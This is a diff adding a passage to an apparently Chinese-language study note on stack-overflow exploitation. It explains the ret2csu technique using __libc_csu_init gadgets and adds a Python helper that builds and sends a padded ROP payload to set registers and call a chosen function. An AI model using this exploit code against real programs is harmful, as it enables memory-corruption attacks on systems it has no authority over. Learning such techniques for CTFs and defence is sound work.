@@ -375,4 +375,31 @@ sleep(0.2)
 conn.interactive()
 ```
 
+
+
+libc_csu_init中我们主要利用了以下寄存器
+利用尾部代码控制了rbx，rbp，r12，r13，r14，r15。
+利用中间部分的代码控制了rdx，rsi，edi。
+通常这样构造的rop链也特别的长，所以一般写成封装函数，调用的时候比较方便
+
+```python
+def csu(rbx, rbp, r12, r13, r14, r15, last):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = 'a' * 0x80 + fakeebp  #填充垃圾字符串
+    payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += 'a' * 0x38
+    payload += p64(last)
+    sh.send(payload)
+    sleep(1)
+
+```
+
+
 > 关于栈溢出的学习先告一段落，先缓缓.....
